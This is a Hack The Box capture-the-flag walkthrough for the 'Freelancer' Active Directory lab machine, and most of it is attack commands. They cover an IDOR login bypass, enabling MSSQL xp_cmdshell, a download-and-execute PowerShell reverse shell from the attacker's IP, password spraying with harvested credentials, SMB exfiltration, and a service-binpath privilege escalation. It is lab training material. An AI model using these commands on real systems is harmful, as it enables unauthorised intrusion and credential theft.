**Ping**
```
ping 10.10.11.5
```
![[Pasted image 20240621133050.png]]

Nmap Default Scan
```
nmap 10.10.11.5 -oN dnmap
```
![[Pasted image 20240621133334.png]]

Nmap Script and Service Scan
```
nmap 10.10.11.5 -sV -sC -A -oN snmap
```
![[Pasted image 20240621133844.png]]
![[Pasted image 20240621133705.png]]
It's an AD box.

Nmap All Port Scan
```
nmap 10.10.11.5 -p- --open -T5 -oN anmap
```
![[Pasted image 20240621133859.png]]
![[Pasted image 20240621133922.png]]

Service Scan for all ports
```
nmap 10.10.11.5 -p- --open -sV -sC -A -T5 -oN anmap
```
![[Pasted image 20240621134702.png]]
![[Pasted image 20240621134731.png]]
![[Pasted image 20240621134756.png]]

Nmap Ldap Scan
```
nmap --script "ldap* and not brute"  10.10.11.5 -p389 -oN ldap_nmap
```
![[Pasted image 20240621135916.png]]

Added freelancer.htb to my hosts file, because http://10.10.11.5 redirected to http://freelancer.htb
![[Pasted image 20240621134057.png]]

http://freelancer.htb
![[Pasted image 20240621134041.png]]

Dig 
```
dig any freelancer.htb @10.10.11.5
```
![[Pasted image 20240621135312.png]]
I'm going to add the two newly found dns names to my hosts file

Hosts file
![[Pasted image 20240621135507.png]]

ffuf Scan
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://freelancer.htb/FUZZ -t 100 -o ffuf.txt
```
![[Pasted image 20240621140005.png]]

/admin
![[Pasted image 20240621140314.png]]

Ok will Analyse the website
We Can see there are two ways to create an account **Freelancer** and **Employer**
![[Pasted image 20240621150935.png]]

Will try to create a employer account with **Username: test** and **Password: test@123456**

I have created the account with above username and password, will try to login 
![[Pasted image 20240621151225.png]]
I can't login because it say's my acc is not Active

We know that why
![[Pasted image 20240621151103.png]]

Lets try Forgot password functionality 
![[Pasted image 20240621151402.png]]

I created my acc with all parameter as test, so I'm using that info to recover my acc
![[Pasted image 20240621151458.png]]

It is Asking me to enter New Password
![[Pasted image 20240621151528.png]]

Will enter new **Password: test@qwerty**

Now will try login with new creds **test:test@qwerty**
![[Pasted image 20240621151656.png]]
Worked...!

I can see there is an QR code option for login
![[Pasted image 20240621152442.png]]

I have got the url with qrcode scanner, we can use qrcode scanner extension in Firefox
![[Pasted image 20240621152722.png]]


Will analyse the url
```
http://freelancer.htb/accounts/login/otp/MTAwMTA=/2e733dce3edb5dfc5889526825ed0d04/
```
In the url this part looks like base64 encoded **MTAwMTA=**

Will decode that value
```
echo 'MTAwMTA=' | base64 -d
```
![[Pasted image 20240621153011.png]]
So this **10010** must be my user id

Now we have to find what is the user id of Admin

I don't know the admin id, after some research for hints, I get to know that admin's id is **2**

So here is my revised url 
```
http://freelancer.htb/accounts/login/otp/Mg==/2e733dce3edb5dfc5889526825ed0d04/
```
base64 encoded value of 2 is Mg== 

Now I'm logged in as admin
![[Pasted image 20240621162841.png]]

Now will try to reach http://freelancer.htb/admin
![[Pasted image 20240621162642.png]]
Yes we can get Admin Accesss.




We can use SQL terminal in the admin's Dashboard
![[Pasted image 20240621175659.png]]
Anyways it show error, will try with other queries

```
SELECT suser_sname(owner_sid) FROM sys.databases
```
![[Pasted image 20240621175845.png]]

```
EXECUTE AS LOGIN = 'sa'  
SELECT IS_SRVROLEMEMBER('sysadmin');
```
![[Pasted image 20240621175928.png]]


Now will enable the xp_cmdshell
```
EXECUTE AS LOGIN = 'sa'
EXEC sp_configure 'show advanced options', '1';
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
![[Pasted image 20240621195719.png]]

Now Will check whether xp_cmdshell is working 
```
EXECUTE AS LOGIN = 'sa'
EXECUTE xp_cmdshell 'whoami';
```
![[Pasted image 20240621200003.png]]
It Worked, will get a Reverse shell now

After trying as many ways to get a reverse shell, the Powershell method Worked

Downloaded PS script from the link:https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1

And changed my ip and port
Then ran this query
```
EXECUTE AS LOGIN = 'sa'
EXECUTE xp_cmdshell 'powershell -c iex(iwr -usebasicparsing http://10.10.14.6/rev.ps1)'
```
![[Pasted image 20240621200530.png]]

Got Reverse shell
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240621200613.png]]

**Don't forget to host python web server before running the query**
**And you have to enable xp_cmdshell every time after a query executed as sysadmin**

Will jump to Lateral Movement.....!


```
whoami /priv
```
![[Pasted image 20240621201244.png]]

```
net user
```
![[Pasted image 20240621201302.png]]

```
powershell
```
```
Get-LocalGroup
```
![[Pasted image 20240621201337.png]]

```
Get-LocalGroupMember DnsAdmins
```
![[Pasted image 20240621201427.png]]

C directory
![[Pasted image 20240621201518.png]]

```
Get-ChildItem -Path C:\Users -Include *.txt, *.log, *.kdbx, *.conf, *.ini -File -Recurse -ErrorAction SilentlyContinue
```
![[Pasted image 20240621205734.png]]
There is an .ini file.

And further Enumeration
![[Pasted image 20240621202844.png]]

Got Some sensitive info from **sql-Configuration.INI**
![[Pasted image 20240621203104.png]]

I have saved user and passwords in a file 
![[Pasted image 20240621204347.png]]

I tried the creds **sql_svc:IL0v3ErenY3ager** but it not worked and also **sql_svc:t3mp0r@ryS@PWD**, no luck
```
crackmapexec smb 10.10.11.5 -u sql_svc -p 'IL0v3ErenY3ager'  --shares
```
![[Pasted image 20240621204624.png]]

```
crackmapexec smb 10.10.11.5 -u sql_svc -p 't3mp0r@ryS@PWD'
```
![[Pasted image 20240621204602.png]]


So I'm going to spray this passwords on all user in the domain

Will try this with Crackmapexec
```
crackmapexec smb 10.10.11.5 -u users.txt -p pass.txt --shares --continue-on-success
```
![[Pasted image 20240621204748.png]]
Got it....!
Found one valid creds **mikasaAckerman:IL0v3ErenY3ager**

```
crackmapexec smb 10.10.11.5 -u mikasaAckerman -p IL0v3ErenY3ager --shares
```
![[Pasted image 20240621204944.png]]

Finally able to get some info in SYSVOL share
```
smbclient //10.10.11.5/SYSVOL -U 'DC//mikasaAckerman%IL0v3ErenY3ager'
```
![[Pasted image 20240621211050.png]]

There is some more files in freelancer, Will get them all
```
recurse ON
prompt OFF
mget *
```
![[Pasted image 20240621211939.png]]

Will Analyse the files now, Nothing usefull

Will get a shell as user mikasaAckerman
I have transferred RunasCs.exe to target machine and execute it
```
./run.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.14.6:443
```
![[Pasted image 20240621214032.png]]

Got it
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240621214209.png]]

Got more files
```
Get-ChildItem -Path C:\Users -Include *.txt, *.log, *.kdbx, *.conf, *.ini -File -Recurse -ErrorAction SilentlyContinue
```
![[Pasted image 20240621214647.png]]

There is a zip file
![[Pasted image 20240621215059.png]]

Will transfer this to out kali using smb share
```
impacket-smbserver test . -smb2support  -username root -password R0ot
```
![[Pasted image 20240621215203.png]]

Connect it 
```
net use m: \\10.10.14.6\test /user:root R0ot
```
![[Pasted image 20240621215242.png]]

Now will transfer
```
copy MEMORY.7z m:\
```
![[Pasted image 20240621215307.png]]

Will check in our kali
![[Pasted image 20240621215335.png]]
Got it.
BTW, it will take time to transfer because its is large file.

Transferred mail.txt as well 
![[Pasted image 20240621215436.png]]

Now Will get **user.txt**
![[Pasted image 20240621215541.png]]

Finally got user.txt....!

Will hunt for root.txt now :)



I think Now it make sense
![[Pasted image 20240621215938.png]]
we have to do memory dump with the Memory.7z

First we have to extract it
```
7z x MEMORY.7z
```
![[Pasted image 20240621222538.png]]

Now We have to use https://github.com/ufrisk/MemProcFS/releases/tag/v5.9
Download the Source.zip and move to the directory of your choice
Then Unzip it
The Download this as well https://github.com/ufrisk/LeechCore/releases/tag/v2.18
Same, Download source.zip file and Follow the Instruction https://github.com/ufrisk/MemProcFS/wiki/_Linux
```
~$  sudo apt-get install make gcc pkg-config libusb-1.0 libusb-1.0-0-dev libfuse2 libfuse-dev lz4 liblz4-dev
~$  mkdir build
~$  cd build
~/build$  git clone https://github.com/ufrisk/LeechCore
~/build$  git clone https://github.com/ufrisk/MemProcFS
~/build$  cd LeechCore/leechcore
~/build/LeechCore/leechcore$  make
~/build/LeechCore/leechcore$  cd ../../MemProcFS/vmm
~/build/MemProcFS/vmm$  make
~/build/MemProcFS/vmm$  cd ../memprocfs
~/build/MemProcFS/memprocfs$  make
~/build/MemProcFS/memprocfs$  cd ../files
### NOTE! before running memprocfs it's recommended to copy the file 'info.db' from the latest binary
### release at https://github.com/ufrisk/MemProcFS/releases/latest and put it alongside memprocfs binary.
### info.db is an sqlite database which contains common type and symbol offsets required for some tasks.
~/build/MemProcFS/files$  ./memprocfs -device <your_dumpfile_or_device> -mount <your_full_mount_point>
```

Once Everything Done, now mount the the .dmp file 
before that make a directory /mnt/memdump
```
mkdir /mnt/memdump
```
```
/root/Tools/MemProcFS-5.9/files/memprocfs -device /root/HTB/windows/freelancer/MEMORY.DMP -mount /mnt/memdump
```
![[Pasted image 20240622003717.png]]
![[Pasted image 20240622003617.png]]

 I have to Analysed the dmp file, after deeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeep analysis, i got a unknown user password PWN3D#l0rr@Armessa199 and **v3ryS0l!dP@sswd#35**

Lets Spray this to all users, first will spray **PWN3D#l0rr@Armessa199**
```
 crackmapexec smb 10.10.11.5 -u users.txt -p 'PWN3D#l0rr@Armessa199' --continue-on-success --shares
```
![[Pasted image 20240623131454.png]]
Cool, it worked for lorra199

Lets try it on winrm
```
crackmapexec winrm 10.10.11.5 -u lorra199 -p 'PWN3D#l0rr@Armessa199'
```
![[Pasted image 20240623131526.png]]
Finalllly....! **lorra199:PWN3D#l0rr@Armessa199**

Will try this password **v3ryS0l!dP@sswd#35**
```
 crackmapexec smb 10.10.11.5 -u users.txt -p 'v3ryS0l!dP@sswd#35' --continue-on-success
```
![[Pasted image 20240623145250.png]]

Will use evil-winrm for lorra199
```
 evil-winrm -i 10.10.11.5 -u lorra199 -p 'PWN3D#l0rr@Armessa199'
```
![[Pasted image 20240623131621.png]]



We have added computer to the domain using lorra199
```
impacket-addcomputer -computer-name 'pwned$' -computer-pass 'pwned@199' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'
```
![[Pasted image 20240623133621.png]]

Will add using wwalker
```
impacket-addcomputer -computer-name 'pwned1$' -computer-pass 'pwned1@199' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/wwalker:'v3ryS0l!dP@sswd#35'
```
![[Pasted image 20240623133740.png]]
Done, So We have two computers now

Now Will delegate the system
```
impacket-rbcd -action write -delegate-from pwned$ -delegate-to dc$ -dc-ip 10.10.11.5 "freelancer.htb/lorra199:PWN3D#l0rr@Armessa199"
```
![[Pasted image 20240623141442.png]]

But I couldn't make progress any further
Can get TGT because of time zone issue

So will try with another password which works for so may accounts
The user jmartinez got interesting privileges
![[Pasted image 20240623145547.png]]

Jmartinez is in service operator Group:
![[Pasted image 20240623164026.png]]
Will abuse server operator
```
sc.exe stop VMTools
sc.exe config VMTools binpath="cmd /c net localgroup administrators jmartinez /add"
sc.exe start VMTools
```
![[Pasted image 20240623164128.png]]

Now Will check
```
net user jmartinez
```
![[Pasted image 20240623164234.png]]

Will get a new shell, so we get a shell as Admin using RunasCs.exe
```
.\run.exe jmartinez "v3ryS0l!dP@sswd#35" cmd.exe -r 10.10.14.6:443
```
![[Pasted image 20240623164327.png]]

Got reverse shell
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240623164452.png]]
![[Pasted image 20240623164505.png]]

Will change Admin's Password, We can also get the root flag from this shell, but still need to be an Domain Controller 
```
net user Administrator pwned@3000
```
![[Pasted image 20240623164743.png]]

Now Will run RunasCs.exe to get Admin Shell
```
.\run.exe Administrator "pwned@3000" cmd.exe -r 10.10.14.6:443
```
![[Pasted image 20240623164904.png]]

Got Reverse shell as Admin
![[Pasted image 20240623164916.png]]

Will get Root flag
![[Pasted image 20240623164957.png]]



Done with Freelancer.....:)



64 bytes from 8.8.8.8: icmp_seq=2 ttl=52 time=10.1 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=52 time=9.60 ms
^C
--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2014ms
rtt min/avg/max/mdev = 9.005/9.573/10.117/0.454 ms